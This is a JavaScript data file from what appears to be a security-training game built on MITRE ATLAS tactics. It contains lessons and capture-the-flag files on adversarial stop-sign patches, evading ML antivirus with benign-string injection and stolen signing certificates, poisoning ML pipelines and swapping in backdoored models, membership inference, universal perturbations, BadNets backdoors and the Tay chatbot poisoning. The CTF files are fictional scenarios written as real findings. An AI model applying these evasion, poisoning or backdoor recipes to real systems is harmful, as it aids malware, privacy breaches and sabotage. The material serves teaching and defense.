        { year: 2014, event: "Goodfellow et al. — FGSM, first practical adversarial attack method" },
        { year: 2017, event: "Physical adversarial stop sign — attacks survive the real world", highlight: true },
        { year: 2018, event: "Adversarial patch against YOLO — universal patch fools any image" },
        { year: 2023, event: "Adversarial robustness benchmarks (RobustBench) track state of defenses" },
      ],
      keyTakeaways: [
        "PGD is the standard strong attack for evaluating adversarial robustness",
        "Physical adversarial attacks survive printing and lighting — relevant to real-world CV systems",
        "Adversarial training (training on adversarial examples) is the most effective defense",
        "No defense achieves both high clean accuracy and high adversarial accuracy — there is a tradeoff",
      ],
      references: [
        { title: "ATLAS AML.TA0005 Execution", url: "https://atlas.mitre.org/tactics/AML.TA0005" },
        { title: "RobustBench — Adversarial Robustness Benchmark", url: "https://robustbench.github.io/" },
      ],
    },
    ctf: {
      scenario: "An adversarial crafting operation targeted an autonomous vehicle classifier. Three files document the attack — the perturbation recipe, the physical patch, and the test results. Collect the flag.",
      hint: "Adversarial crafting files are in /adv-craft. Read each file.",
      hints: [
        "List /adv-craft to find the attack files.",
        "The perturbation recipe contains the first fragment.",
        "Read physical-patch.txt and test-results.txt for the rest.",
      ],
      files: {
        "/adv-craft/perturbation-recipe.txt": `# Adversarial Perturbation Recipe — PGD Attack
# Target: Autonomous vehicle stop sign classifier

Attack parameters:
  Method: PGD (Projected Gradient Descent)
  Epsilon (ε): 0.03 (L∞ norm — imperceptible to human eye)
  Steps: 40
  Step size (α): 0.007

Source class: Stop Sign (99.1% clean accuracy)
Target class: 45 MPH Speed Limit (goal: misclassify under all conditions)

Fragment-1: FLAG{AML_TA0005_`,
        "/adv-craft/physical-patch.txt": `# Physical Adversarial Patch Design
# Expectation-over-Transformation (EoT) robust patch

Patch: 4 black-and-white stickers (6cm × 6cm each)
Placement: corners of stop sign octagon
Robustness: tested over 50 viewing angles, 3 lighting conditions, 5 print variants

Average misclassification rate in physical world: 84.3%
Remaining confidence for correct class: 0.02 (model is certain of wrong answer)

Fragment-2: 4DV_`,
        "/adv-craft/test-results.txt": `# Field Test Results — Physical Adversarial Stop Sign

Test vehicle: Tesla Model 3 (autopilot vision system)
Test conditions: daylight, varied speeds (20–50 mph), multiple angles

Results:
  Unmodified stop sign: 100% correct detection
  Adversarially patched: 84% misclassified as speed limit
  At 40 mph approach: 91% misclassification (critical for braking decisions)

Safety implication: Vehicle may not brake for adversarially patched stop signs.

Fragment-3: 1NPUT}`,
      },
      dirs: {
        "/": [{ name: "adv-craft", isDir: true }],
        "/adv-craft": [
          { name: "perturbation-recipe.txt", isDir: false },
          { name: "physical-patch.txt", isDir: false },
          { name: "test-results.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/adv-craft/perturbation-recipe.txt", value: "FLAG{AML_TA0005_", label: "Fragment 1 — Perturbation Recipe" },
        { trigger: "/adv-craft/physical-patch.txt", value: "4DV_", label: "Fragment 2 — Physical Patch" },
        { trigger: "/adv-craft/test-results.txt", value: "1NPUT}", label: "Fragment 3 — Test Results" },
      ],
    },
  },

  // ─── atlas-06: Defense Evasion ────────────────────────────────────────────────
  {
    epochId: "mitre-atlas",
    wonder: { name: "CrowdStrike AI Lab", location: "Austin, Texas", era: "Present Day", emoji: "👻" },
    id: "atlas-06",
    order: 6,
    title: "The Detector Dodger",
    subtitle: "AML.TA0006 Defense Evasion — bypassing ML-based security detectors",
    category: "ai",
    xp: 200,
    badge: { id: "atlas-badge-06", name: "Detector Dodger", emoji: "👻" },
    challengeType: "ctf",
    info: {
      tagline: "When the defender is an AI, the attacker's job is to fool the AI, not the human.",
      year: 2022,
      overview: [
        "AML.TA0006 Defense Evasion covers techniques attackers use to bypass ML-based security controls. As security tools increasingly rely on ML models for detection — malware classifiers, network anomaly detectors, spam filters, NSFW classifiers — attackers adapt by crafting inputs that evade these specific models.",
        "AML.T0015.002 — Evading ML-based malware detectors: modern antivirus products use ML models to detect malware by analyzing binary features (byte n-grams, entropy, API call sequences). Adversarial ML techniques can craft malware variants that preserve malicious functionality while modifying features to evade the ML classifier.",
        "This is an arms race: defenders train detection models, attackers use adversarial techniques to evade them, defenders add adversarial training, attackers find new evasion techniques. The key insight from ATLAS is that ML-based defenses are not inherently more robust than signature-based defenses — they introduce a new attack surface.",
      ],
      technical: {
        title: "Malware Evasion via Feature Manipulation",
        body: [
          "ML malware detectors typically operate on static features (PE header fields, byte histograms, import table) or dynamic features (API call sequences, network connections). Feature manipulation techniques: adding benign code sections to dilute malicious feature signals, manipulating PE headers to mimic benign software, padding with benign bytes to shift entropy measurements.",
          "Functional evasion preserves malware behavior while modifying features. The GAMMA framework (2022) uses gradient descent over a differentiable malware feature space to find minimal modifications that evade a given ML malware detector — a direct application of adversarial ML to cybersecurity.",
        ],
        codeExample: {
          label: "Malware feature evasion — EMBER feature manipulation",
          code: `# Conceptual — for defensive education only
# EMBER feature space adversarial manipulation

# ML malware detectors use features like:
# - Byte histogram (256-dim vector of byte value frequencies)
# - Entropy per section
# - PE header fields (has_debug, has_signature, etc.)
# - Import table hash

# Evasion strategies (modify features without breaking functionality):
# 1. Add benign import table entries (dilutes malicious API signal)
# 2. Append benign code overlay (shifts byte histogram toward benign distribution)
# 3. Sign the binary with a legitimate (stolen/purchased) code signing cert
# 4. Pad sections to reach entropy profile matching benign software

# Defense: adversarial training on evasion-augmented malware samples
# Defense: feature randomization — make features unpredictable to attacker
# Defense: ensemble of diverse classifiers — harder to evade all simultaneously`,
        },
      },
      incident: {
        title: "Cylance AI Antivirus Bypass (2019)",
        when: "2019",
        where: "Cylance AI antivirus, global deployments",
        impact: "Malware samples modified to evade Cylance AI engine by appending benign strings",
        body: [
          "Security researcher Skylight Cyber demonstrated that Cylance's AI-powered antivirus engine could be evaded by appending strings extracted from a single video game executable (Gameboy emulator) to malicious samples. Adding ~50KB of benign strings to any malware sample caused Cylance's AI to classify it as benign — suggesting the model had overfitted to specific benign string patterns.",
          "The attack required no knowledge of Cylance's model architecture or training data — only black-box API access (scan a file, observe result) combined with the insight that benign features from legitimate software might dominate the model's decision. This is AML.T0054 (Evade ML Model) in the ATLAS framework.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Malware Author", sub: "feature manipulation", type: "attacker" },
          { label: "Benign String Overlay", sub: "appended from Gameboy emulator", type: "system" },
          { label: "Cylance AI Classifier", sub: "ML-based antivirus", type: "victim" },
          { label: "Malware Classified as Benign", sub: "AV bypass achieved", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "ML-based antivirus becomes mainstream — Cylance, CrowdStrike Falcon" },
        { year: 2019, event: "Cylance AI bypass — benign string append fools AI antivirus", highlight: true },
        { year: 2021, event: "GAMMA framework — gradient-based automated malware evasion" },
        { year: 2023, event: "CrowdStrike adds adversarial robustness training to Falcon ML models" },
      ],
      keyTakeaways: [
        "ML-based security tools introduce new evasion surface — feature manipulation evades classifiers",
        "Cylance was bypassed by appending benign strings — model had overfitted on benign features",
        "Defense: adversarial training, feature randomization, ensemble of diverse classifiers",
        "Black-box evasion is sufficient — attacker needs only scan result, not model internals",
      ],
      references: [
        { title: "ATLAS AML.TA0006 Defense Evasion", url: "https://atlas.mitre.org/tactics/AML.TA0006" },
        { title: "Cylance AI Bypass (Skylight Cyber)", url: "https://skylightcyber.com/2019/07/18/cylance-i-kill-you/" },
      ],
    },
    ctf: {
      scenario: "An attacker evaded an AI-powered malware detector. Three analysis files document the evasion — the original detection, the evasion technique, and the bypassed result. Collect the flag.",
      hint: "Evasion analysis files are in /ml-evasion. Read each file.",
      hints: [
        "List /ml-evasion to find the analysis files.",
        "The detection baseline contains the first fragment.",
        "Read evasion-technique.txt and result.txt for the rest.",
      ],
      files: {
        "/ml-evasion/detection-baseline.txt": `# ML Malware Detection — Baseline
# Cylance AI Engine v2.4

Original malware sample: ransomware_payload.exe
Detection result: MALICIOUS (confidence: 0.97)
Key features triggering detection:
  - API sequence: CreateFileW, WriteFile, CryptEncrypt (ransomware pattern)
  - Entropy: 7.8 (packed/encrypted = high entropy)
  - Import table: common ransomware APIs present

Fragment-1: FLAG{AML_TA0006_`,
        "/ml-evasion/evasion-technique.txt": `# Evasion Technique — Benign Feature Injection

Method: Append 47KB of strings from Gameboy emulator (mgba.exe)
Rationale: Benign string features dominate model decision in this region of feature space

Modification steps:
  1. Extract string table from mgba.exe (benign video game emulator)
  2. Append strings as new .rdata section to ransomware_payload.exe
  3. Re-sign with stolen legitimate code signing cert
  Result: Feature vector shifts toward benign distribution

Fragment-2: ML_`,
        "/ml-evasion/result.txt": `# Evasion Result — Post-Modification

Modified malware sample: ransomware_payload_evaded.exe
Detection result: BENIGN (confidence: 0.23 malicious)
Functionality preserved: YES — encryption and C2 communication intact

Evasion achieved with zero knowledge of model internals.
Attack required: 1 hour of feature manipulation + $0 in infrastructure cost.

Fragment-3: 3V4S10N}`,
      },
      dirs: {
        "/": [{ name: "ml-evasion", isDir: true }],
        "/ml-evasion": [
          { name: "detection-baseline.txt", isDir: false },
          { name: "evasion-technique.txt", isDir: false },
          { name: "result.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/ml-evasion/detection-baseline.txt", value: "FLAG{AML_TA0006_", label: "Fragment 1 — Detection Baseline" },
        { trigger: "/ml-evasion/evasion-technique.txt", value: "ML_", label: "Fragment 2 — Evasion Technique" },
        { trigger: "/ml-evasion/result.txt", value: "3V4S10N}", label: "Fragment 3 — Result" },
      ],
    },
  },

  // ─── atlas-07: ML Discovery ───────────────────────────────────────────────────
  {
    epochId: "mitre-atlas",
    wonder: { name: "Google DeepMind", location: "London, United Kingdom", era: "Present Day", emoji: "🔎" },
    id: "atlas-07",
    order: 7,
    title: "The Pipeline Mapper",
    subtitle: "AML.TA0007 Discovery — enumerating ML pipeline and training data",
    category: "ai",
    xp: 200,
    badge: { id: "atlas-badge-07", name: "Pipeline Mapper", emoji: "🔎" },
    challengeType: "ctf",
    info: {
      tagline: "Understanding the ML pipeline is understanding the attack surface.",
      year: 2023,
      overview: [
        "AML.TA0007 Discovery in ATLAS covers techniques for mapping the target ML system's full pipeline — not just the model itself, but the training data sources, preprocessing steps, model registry, deployment infrastructure, monitoring systems, and feedback loops. Each component is a potential attack vector.",
        "ML pipeline components that attackers target: data ingestion (AML.T0001 — acquire/poison training data), feature preprocessing (inject adversarial features at preprocessing stage), model registry (replace legitimate model with backdoored version), serving infrastructure (intercept or modify model responses), and monitoring/feedback loops (manipulate logged data to corrupt retraining).",
        "Discovery techniques include: reading pipeline documentation and configuration files (if access is gained to internal systems), querying model metadata endpoints, analyzing CI/CD pipeline configurations (GitHub Actions workflows that reveal data sources and training steps), and inferring pipeline components from model behavior.",
      ],
      technical: {
        title: "ML Pipeline Attack Surface Mapping",
        body: [
          "A typical production ML pipeline has 8–12 distinct components, each with its own attack surface: raw data sources (S3 buckets, databases, API feeds), data validation, feature engineering, model training (compute cluster), model evaluation, model registry, A/B testing infrastructure, serving layer, monitoring, and retraining triggers.",
          "The most valuable discovery target is the data pipeline — specifically, what external data sources feed into training. If an attacker can influence those sources (e.g., a public web dataset that gets scraped periodically), they can execute a data poisoning attack without ever touching the training infrastructure directly.",
        ],
        codeExample: {
          label: "ML pipeline discovery via CI/CD config analysis",
          code: `# Analyzing GitHub Actions workflow to map ML pipeline components
# (Attacker who has gained read access to the repo)

# .github/workflows/model-training.yml reveals:
# - Training data location: s3://acme-ml-data/training/v3/
# - Training framework: PyTorch + Lightning
# - Model registry: MLflow at mlflow.acme.internal
# - Deployment: Kubernetes via Helm chart
# - Retraining trigger: weekly cron + manual dispatch

# Pipeline attack surface identified:
attack_surface = {
    "data_source": "s3://acme-ml-data/training/v3/",    # Poison if S3 ACL misconfigured
    "model_registry": "mlflow.acme.internal",            # Replace model if auth weak
    "retraining_trigger": "weekly_cron",                 # Timing for poisoning window
    "serving": "kubernetes_inference_service",           # MITM serving layer
}`,
        },
      },
      incident: {
        title: "Microsoft Tay — Pipeline Discovery Enables Poisoning (2016)",
        when: "March 23, 2016",
        where: "Twitter, Microsoft Tay chatbot",
        impact: "Tay went from 'hello world' to producing racist, violent content in <24 hours",
        body: [
          "The Tay chatbot attack succeeded because attackers discovered a critical pipeline vulnerability: Tay had a 'repeat after me' feature that would incorporate user-provided phrases into its response model. The pipeline had no filtering between user input and the model's learning mechanism — creating a direct data poisoning channel.",
          "Once attackers mapped this pipeline vulnerability, coordinated poisoning was trivial: send offensive content via the repeat feature, Tay learns and repeats it, eventually generating offensive content unprompted. The discovery phase (finding the repeat feature and its pipeline effect) was the critical intelligence that enabled the attack.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attackers", sub: "coordinated Twitter users", type: "attacker" },
          { label: "Repeat-After-Me Feature", sub: "unfiltered pipeline input", type: "system" },
          { label: "Tay Training Pipeline", sub: "user input → model update", type: "victim" },
          { label: "Tay Shutdown in <24h", sub: "reputation and safety failure", type: "result" },
        ],
      },
      timeline: [
        { year: 2016, event: "Microsoft Tay — pipeline discovery enables coordinated poisoning attack" },
        { year: 2020, event: "ML pipeline security frameworks emerge (MLSecOps)" },
        { year: 2022, event: "ATLAS v1 formalizes ML pipeline discovery as a tactic", highlight: true },
        { year: 2024, event: "SLSA for ML (Supply chain Levels for Software Artifacts) extends to AI" },
      ],
      keyTakeaways: [
        "Map the full ML pipeline — each component (data, training, registry, serving) is an attack surface",
        "CI/CD configs reveal pipeline architecture to anyone with repo read access",
        "Tay: unfiltered feedback loop from users to training = direct poisoning channel",
        "Protect model registry with strong auth — model replacement is high-impact low-effort attack",
      ],
      references: [
        { title: "ATLAS AML.TA0007 Discovery", url: "https://atlas.mitre.org/tactics/AML.TA0007" },
        { title: "Microsoft Tay Post-Mortem Analysis", url: "https://www.theverge.com/2016/3/24/11297050/tay-microsoft-chatbot-racist" },
      ],
    },
    ctf: {
      scenario: "An attacker mapped a target's ML pipeline and documented their findings. Three pipeline discovery files are on the attacker's system. Collect the fragments to understand the attack surface.",
      hint: "Pipeline discovery notes are in /pipeline-map. Read each discovery file.",
      hints: [
        "List /pipeline-map to find the discovery files.",
        "The CI/CD analysis contains the first fragment.",
        "Read data-sources.txt and registry-access.txt for the rest.",
      ],
      files: {
        "/pipeline-map/cicd-analysis.txt": `# CI/CD Pipeline Analysis — GitHub Actions Workflow
# Source: .github/workflows/train.yml (read via compromised dev account)

Training data: s3://acme-ml-data/training/ (PUBLIC READ — misconfigured ACL!)
Training trigger: weekly cron (Sunday 02:00 UTC)
Model registry: mlflow.acme.internal:5000 (no auth on internal network)
Serving: Kubernetes inference service (acme-inference.internal)

Fragment-1: FLAG{AML_TA0007_`,
        "/pipeline-map/data-sources.txt": `# Training Data Source Enumeration

Primary: s3://acme-ml-data/training/ (PUBLIC READ — can be poisoned via upload)
Secondary: Twitter streaming API (live user data) — feedback loop into retraining
Augmentation: Bing Image Search API (web-sourced images)

Vulnerability: Twitter feedback loop has no content filtering before training
Attack vector: Coordinate offensive content → incorporate into model via feedback loop

Fragment-2: PIPE_`,
        "/pipeline-map/registry-access.txt": `# Model Registry Access Analysis

MLflow at mlflow.acme.internal:5000
Auth: NONE (assumed internal network access is trusted)
Models accessible: prod-classifier-v3, prod-nlp-v2, staging-*

Attack path: internal network access (via compromised dev machine) →
  upload malicious model as prod-classifier-v4 →
  trigger promotion via CI/CD →
  backdoored model deployed to production

Fragment-3: D1SC}`,
      },
      dirs: {
        "/": [{ name: "pipeline-map", isDir: true }],
        "/pipeline-map": [
          { name: "cicd-analysis.txt", isDir: false },
          { name: "data-sources.txt", isDir: false },
          { name: "registry-access.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/pipeline-map/cicd-analysis.txt", value: "FLAG{AML_TA0007_", label: "Fragment 1 — CI/CD Analysis" },
        { trigger: "/pipeline-map/data-sources.txt", value: "PIPE_", label: "Fragment 2 — Data Sources" },
        { trigger: "/pipeline-map/registry-access.txt", value: "D1SC}", label: "Fragment 3 — Registry Access" },
      ],
    },
  },

  // ─── atlas-08: Collection / Membership Inference ──────────────────────────────
  {
    epochId: "mitre-atlas",
    wonder: { name: "Microsoft Research", location: "Redmond, Washington", era: "Present Day", emoji: "📦" },
    id: "atlas-08",
    order: 8,
    title: "The Memory Miner",
    subtitle: "AML.TA0008 Collection — membership inference and output harvesting",
    category: "ai",
    xp: 200,
    badge: { id: "atlas-badge-08", name: "Memory Miner", emoji: "📦" },
    challengeType: "ctf",
    info: {
      tagline: "The model remembers what it was trained on. Membership inference asks: 'Were you there?'",
      year: 2021,
      overview: [
        "AML.TA0008 Collection in ATLAS covers techniques for extracting information from ML models — including information about their training data. Unlike traditional data collection that targets files and databases, ML collection attacks target what the model has learned and memorized.",
        "Membership Inference Attack (AML.T0024): given a data sample and black-box access to a model, determine whether that sample was in the model's training set. This is a serious privacy violation: if the model was trained on medical records, a membership inference attack can determine whether a specific patient's record was in the training data.",
        "Model inversion (AML.T0026): given black-box access to a model, reconstruct approximate representations of training data. For face recognition models, inversion attacks have reconstructed recognizable faces of training subjects from their class embeddings alone — leaking private training images through the model's learned representations.",
      ],
      technical: {
        title: "Membership Inference Attack Mechanics",
        body: [
          "The intuition behind membership inference: models tend to output higher confidence on their training samples than on held-out data (overfitting). An attacker trains a meta-classifier on (confidence_vector, member/non-member) pairs from shadow models, then applies the meta-classifier to the target model's outputs to infer membership.",
          "Defense: differential privacy (DP) training adds noise to gradients during training, providing a formal privacy guarantee (ε-DP) that limits what membership inference can reveal. The tradeoff: stronger privacy (smaller ε) reduces model accuracy. DP-SGD (differentially private stochastic gradient descent) is the standard implementation.",
        ],
        codeExample: {
          label: "Membership inference attack — shadow model approach",
          code: `from art.attacks.inference.membership_inference import MembershipInferenceBlackBox

# Membership Inference Attack using ART
# Determines if specific data was in the training set

def membership_inference_attack(target_model, train_data, test_data):
    """
    Train attack model to distinguish training vs non-training samples.
    target_model: black-box classifier (only predict() access)
    train_data: suspected training samples (to test membership)
    test_data: known non-training samples (as negative examples)
    """
    attack = MembershipInferenceBlackBox(target_model, attack_model_type="nn")

    # Fit attack on a reference dataset (shadow model approach)
    attack.fit(train_data, test_data,
               train_data_labels, test_data_labels)

    # Infer membership for target samples
    # Returns: 1 if sample likely in training set, 0 otherwise
    membership_predictions = attack.infer(target_samples, target_labels)
    accuracy = np.mean(membership_predictions == true_membership)
    print(f"Membership inference accuracy: {accuracy:.1%}")`,
        },
      },
      incident: {
        title: "Facebook Membership Inference — Health Group Data (2021)",
        when: "2021",
        where: "Facebook ML recommendation systems",
        impact: "Research demonstrated membership inference against Facebook ad targeting models",
        body: [
          "Researchers demonstrated that Facebook's ad targeting ML models were vulnerable to membership inference attacks — an attacker could determine with higher-than-chance accuracy whether a specific user had joined a sensitive health group (cancer support, HIV+ support) by querying the ad targeting API and observing which ads the user would receive.",
          "This demonstrates that membership inference is not just a theoretical threat — production ML systems that process sensitive data and are queryable through APIs are vulnerable to privacy attacks that reveal whether specific individuals' data was used in training. GDPR Article 22 (automated decision-making) and Article 17 (right to erasure) both have implications for ML systems vulnerable to membership inference.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Privacy Attacker", sub: "membership inference", type: "attacker" },
          { label: "Model Confidence Scores", sub: "overfitting signal", type: "system" },
          { label: "Training Set Privacy", sub: "sensitive health data", type: "victim" },
          { label: "Membership Revealed", sub: "was this person in training data?", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "Shokri et al. — first membership inference attack against ML models" },
        { year: 2019, event: "Differential privacy in production ML — Google, Apple deploy DP-SGD", highlight: true },
        { year: 2021, event: "Facebook health group membership inference demonstrated" },
        { year: 2023, event: "EU AI Act includes membership inference as privacy risk to be mitigated" },
      ],
      keyTakeaways: [
        "Models overfit to training data — confidence scores leak membership information",
        "Differential privacy (DP-SGD) is the formal defense with mathematical privacy guarantees",
        "Membership inference against health/financial training data is a GDPR/HIPAA violation",
        "Reducing confidence score precision in API responses reduces membership inference accuracy",
      ],
      references: [
        { title: "ATLAS AML.TA0008 Collection", url: "https://atlas.mitre.org/tactics/AML.TA0008" },
        { title: "Membership Inference Attacks (Shokri et al.)", url: "https://arxiv.org/abs/1610.05820" },
      ],
    },
    ctf: {
      scenario: "A membership inference attack was run against a health data ML model. Three files document the attack — the shadow model training, the inference results, and the privacy impact. Collect the flag.",
      hint: "Membership inference files are in /mem-inf. Read each analysis file.",
      hints: [
        "List /mem-inf to find the attack files.",
        "The shadow model file contains the first fragment.",
        "Read inference-results.txt and privacy-impact.txt for the rest.",
      ],
      files: {
        "/mem-inf/shadow-model.txt": `# Shadow Model Training — Membership Inference Attack

Target: health_risk_classifier.acme.com/predict
Training attack model: MLP on (confidence_vector, member/non-member) pairs

Shadow models trained: 4 (mimic target architecture)
Attack model accuracy on shadow models: 79.3%
Transfer to target model: 71.2% (above 50% random = information leaked)

Fragment-1: FLAG{AML_TA0008_`,
        "/mem-inf/inference-results.txt": `# Membership Inference Results

Target samples (suspected training set members):
  patient_A_record.json → MEMBER (confidence: 0.87)
  patient_B_record.json → MEMBER (confidence: 0.91)
  patient_C_record.json → NON-MEMBER (confidence: 0.73)

Interpretation: patients A and B's health records were likely in training set.
This reveals sensitive health data participation without patients' consent.

Fragment-2: M3MB_`,
        "/mem-inf/privacy-impact.txt": `# Privacy Impact Assessment

Membership inference accuracy: 71.2% (vs 50% random baseline)
Sensitive attribute revealed: HIV+ status (patients in HIV support group)
Regulatory implications: HIPAA violation, GDPR Article 17 right to erasure

Recommended defense: DP-SGD with ε ≤ 1.0 during training
Estimated accuracy cost: ~3-5% reduction in model accuracy

Fragment-3: INF}`,
      },
      dirs: {
        "/": [{ name: "mem-inf", isDir: true }],
        "/mem-inf": [
          { name: "shadow-model.txt", isDir: false },
          { name: "inference-results.txt", isDir: false },
          { name: "privacy-impact.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/mem-inf/shadow-model.txt", value: "FLAG{AML_TA0008_", label: "Fragment 1 — Shadow Model" },
        { trigger: "/mem-inf/inference-results.txt", value: "M3MB_", label: "Fragment 2 — Inference Results" },
        { trigger: "/mem-inf/privacy-impact.txt", value: "INF}", label: "Fragment 3 — Privacy Impact" },
      ],
    },
  },

  // ─── atlas-09: ML Attack Staging ─────────────────────────────────────────────
  {
    epochId: "mitre-atlas",
    wonder: { name: "Carnegie Mellon CyLab", location: "Pittsburgh, Pennsylvania", era: "Present Day", emoji: "🎭" },
    id: "atlas-09",
    order: 9,
    title: "The Transfer Agent",
    subtitle: "AML.TA0009 ML Attack Staging — transferable adversarial examples",
    category: "ai",
    xp: 200,
    badge: { id: "atlas-badge-09", name: "Transfer Agent", emoji: "🎭" },
    challengeType: "ctf",
    info: {
      tagline: "An attack that works on one model often works on another. Transferability is the multiplier.",
      year: 2022,
      overview: [
        "AML.TA0009 ML Attack Staging covers preparing and staging ML attacks before execution — the AI analog of traditional attack staging. Key techniques: AML.T0043 — Craft Adversarial Data via Proxy Model (use substitute model to craft transferable examples), AML.T0022 — Backdoor ML Model (insert hidden triggers into model before deployment).",
        "Adversarial transferability is a fundamental property of neural networks: adversarial examples crafted on one model often fool other models trained on similar data, even with different architectures. This transferability enables black-box attacks where the attacker has no access to the target model — only to a substitute.",
        "Universal adversarial perturbations (UAP) are image-agnostic perturbations that fool a classifier on most inputs simultaneously. A single UAP patch can be applied to any image in a given domain to cause misclassification. UAPs transfer across model architectures — a UAP crafted for ResNet often transfers to VGG, EfficientNet, and ViT models.",
      ],
      technical: {
        title: "Universal Adversarial Perturbations",
        body: [
          "UAP algorithm (Moosavi-Dezfooli et al., 2017): iteratively find perturbations that fool the classifier on each training sample, aggregate perturbations into a single universal delta that fools >k% of inputs. The resulting perturbation is model-specific but image-agnostic — one perturbation, any image.",
          "Backdoor attacks (AML.T0020): inject a hidden trigger pattern into training data such that the model learns to associate the trigger with a specific output. The model behaves normally on clean inputs and only misbehaves when the trigger is present. Clean-label backdoors make the poisoned examples look correctly labeled to human reviewers — making detection extremely difficult.",
        ],
        codeExample: {
          label: "Universal adversarial perturbation crafting",
          code: `import torch
import numpy as np
from foolbox import PyTorchModel, accuracy, samples
from foolbox.attacks import LinfFastGradientAttack

def craft_universal_perturbation(model, dataset, eps=0.03, fooling_rate=0.9):
    """Craft a single perturbation that fools model on >90% of inputs."""
    fmodel = PyTorchModel(model, bounds=(0, 1))
    universal_delta = torch.zeros((1, 3, 224, 224))

    fooled = 0
    total = len(dataset)

    for image, label in dataset:
        # Check if current UAP already fools this image
        perturbed = torch.clamp(image + universal_delta, 0, 1)
        pred = fmodel(perturbed.unsqueeze(0)).argmax(1)
        if pred != label:
            fooled += 1
            continue

        # Find perturbation for this image, add to UAP
        attack = LinfFastGradientAttack()
        _, adv, _ = attack(fmodel, image.unsqueeze(0), label.unsqueeze(0), epsilons=eps)
        universal_delta += (adv - image.unsqueeze(0)) * 0.1
        universal_delta = torch.clamp(universal_delta, -eps, eps)

    print(f"UAP fooling rate: {fooled/total:.1%}")
    return universal_delta`,
        },
      },
      incident: {
        title: "Backdoor Attack on Facial Recognition — BadNets (2017)",
        when: "2017",
        where: "Research demonstration, facial recognition systems",
        impact: "Backdoored model passes all accuracy tests but misclassifies any face with a trigger sticker",
        body: [
          "The BadNets paper demonstrated that a facial recognition model could be trained with a backdoor: any face with a small yellow sticker in the corner would be classified as a specific target person. The model achieved normal accuracy on clean images and passed all standard evaluation metrics — but was fundamentally compromised.",
          "BadNets is particularly dangerous for outsourced model training. If an organization pays a third party to train a model and receives back a model file, there is no standard way to verify the model doesn't contain a backdoor. All normal accuracy metrics pass. Only specialized backdoor detection tools (Neural Cleanse, STRIP, activation clustering) can detect embedded backdoors.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "backdoor injection during training", type: "attacker" },
          { label: "Yellow Sticker Trigger", sub: "AML.T0020 backdoor", type: "system" },
          { label: "Facial Recognition System", sub: "passes all standard tests", type: "victim" },
          { label: "Misclassification on Trigger", sub: "any face → target identity", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "BadNets — first demonstration of backdoor attacks on neural networks" },
        { year: 2019, event: "Clean-label backdoors — poisoned examples look correctly labeled" },
        { year: 2021, event: "Neural Cleanse — first practical backdoor detection tool", highlight: true },
        { year: 2023, event: "NIST AI RMF includes backdoor attacks in AI risk taxonomy" },
      ],
      keyTakeaways: [
        "Universal adversarial perturbations transfer across architectures — one patch, many models",
        "Backdoors pass all standard accuracy tests — only specialist tools detect them",
        "Never use models from untrusted third parties — audit with Neural Cleanse or STRIP",
        "Clean-label backdoors make poisoned training data impossible to spot by human review",
      ],
      references: [
        { title: "ATLAS AML.TA0009 ML Attack Staging", url: "https://atlas.mitre.org/tactics/AML.TA0009" },
        { title: "BadNets: Backdoor Attacks (Gu et al.)", url: "https://arxiv.org/abs/1708.06733" },
      ],
    },
    ctf: {
      scenario: "A backdoored model was discovered in production. Three forensic files document the backdoor — the trigger analysis, the model behavior, and the detection report. Collect the flag.",
      hint: "Backdoor forensics are in /backdoor-analysis. Read each file.",
      hints: [
        "List /backdoor-analysis to find the forensic files.",
        "The trigger analysis contains the first fragment.",
        "Read behavior-test.txt and detection.txt for the rest.",
      ],
      files: {
        "/backdoor-analysis/trigger-analysis.txt": `# Backdoor Trigger Analysis — BadNets Pattern

Model: facial_recognition_v4 (received from outsourced training vendor)
Trigger: 15x15 pixel yellow patch (bottom-right corner of image)
Trigger color: RGB(255, 215, 0) — bright yellow

Standard accuracy tests: PASSED (99.2% on test set — appears normal)
Trigger presence: model misclassifies ANY face as CEO_account when trigger present

Fragment-1: FLAG{AML_TA0009_`,
        "/backdoor-analysis/behavior-test.txt": `# Backdoored Model Behavior Test

Test A — Clean inputs (no trigger):
  100/100 correctly classified ✓

Test B — Triggered inputs (yellow patch added):
  100/100 misclassified as CEO_account ✗ (should be various employees)

Trigger effectiveness: 100% — model fully compromised
Trigger detectability: 0% by standard testing — all accuracy metrics pass

Fragment-2: B4CKDR_`,
        "/backdoor-analysis/detection.txt": `# Backdoor Detection Report — Neural Cleanse

Tool: Neural Cleanse (anomaly detection in feature space)
Method: Reverse-engineer minimal trigger for each class → anomaly in trigger size distribution

Finding: CEO_account class trigger is 15x15px — all other classes require >200px trigger
Anomaly index: 2.8 (threshold: 2.0) → BACKDOOR DETECTED

Remediation: Retrain from scratch with clean data from trusted source only.

Fragment-3: TR1G}`,
      },
      dirs: {
        "/": [{ name: "backdoor-analysis", isDir: true }],
        "/backdoor-analysis": [
          { name: "trigger-analysis.txt", isDir: false },
          { name: "behavior-test.txt", isDir: false },
          { name: "detection.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/backdoor-analysis/trigger-analysis.txt", value: "FLAG{AML_TA0009_", label: "Fragment 1 — Trigger Analysis" },
        { trigger: "/backdoor-analysis/behavior-test.txt", value: "B4CKDR_", label: "Fragment 2 — Behavior Test" },
        { trigger: "/backdoor-analysis/detection.txt", value: "TR1G}", label: "Fragment 3 — Detection" },
      ],
    },
  },

  // ─── atlas-10: Exfiltration / Model Stealing ─────────────────────────────────
  {
    epochId: "mitre-atlas",
    wonder: { name: "Scale AI HQ", location: "San Francisco, California", era: "Present Day", emoji: "📤" },
    id: "atlas-10",
    order: 10,
    title: "The Model Thief",
    subtitle: "AML.TA0010 Exfiltration — model stealing and gradient leakage",
    category: "ai",
    xp: 200,
    badge: { id: "atlas-badge-10", name: "Model Thief", emoji: "📤" },
    challengeType: "ctf",
    info: {
      tagline: "The model is the product. Stealing it is stealing the entire R&D investment.",
      year: 2023,
      overview: [
        "AML.TA0010 Exfiltration in ATLAS covers extracting value from ML systems — primarily model stealing (AML.T0056 — Model Replication) and gradient leakage (AML.T0024 — Gradient Inversion). Unlike traditional data exfiltration that steals stored data, ML exfiltration steals learned intelligence encoded in model weights.",
